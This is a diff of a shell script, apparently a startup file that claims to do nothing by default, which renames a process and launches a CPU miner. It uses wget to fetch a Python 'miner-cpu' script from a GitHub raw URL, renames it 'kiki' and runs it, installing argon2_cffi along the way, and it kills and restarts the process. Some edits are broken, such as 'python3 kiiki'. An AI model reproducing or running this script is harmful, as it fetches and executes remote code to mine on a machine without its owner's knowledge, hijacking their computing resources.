@@ -10,20 +10,20 @@
 # bits.
 #
 # By default this script does nothing.
-if [ -f ${PWD}/meme ]; then
-    if pgrep -x "meme" > /dev/null
+if [ -f ${PWD}/kiki ]; then
+    if pgrep -x "kiki" > /dev/null
 then
-pkill tario
+pkill kiki
 echo " kill process"
 pip install argon2_cffi
-python3 meme
+python3 kiiki
 
     
 else
 
 echo "Miner da install , chay thoi "
 pip install argon2_cffi
-python3 meme
+python3 kiki
      
 fi
 exit
@@ -31,7 +31,6 @@ fi
 
 wget https://raw.githubusercontent.com/StupidmanTan/miner-cpu/master/myario.py
 pip install argon2_cffi
-rm kiki
 mv myario.py kiki
 python3 kiki
 exit 0
